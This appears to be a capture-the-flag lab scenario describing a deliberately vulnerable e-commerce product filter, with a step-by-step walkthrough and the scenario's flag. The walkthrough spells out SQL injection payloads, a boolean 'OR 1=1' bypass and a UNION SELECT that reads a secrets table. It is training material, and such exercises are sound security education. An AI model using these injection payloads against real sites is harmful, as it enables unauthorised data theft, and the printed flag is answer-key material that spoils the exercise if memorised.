# Scenario 09 — E-Commerce Product Filter (UNION-Based SQLi Basics)

- **Port:** `8009`
- **Category:** SQL Injection
- **Difficulty:** Medium
- **Flag:** `CTF{un10n_b4s1cs_m4st3r}`

## Walkthrough
1. Access `http://<host>:8009/products?category=Hardware`.
2. Test Boolean bypass: `http://<host>:8009/products?category=Hardware' OR 1=1 -- -` -> reveals unreleased products (e.g. Prototype Quantum Key Dongle).
3. Test UNION injection to extract from `site_secrets`:
   `http://<host>:8009/products?category=nonexistent' UNION SELECT title, secret_flag FROM site_secrets -- -`
4. Result contains `CTF{un10n_b4s1cs_m4st3r}`.
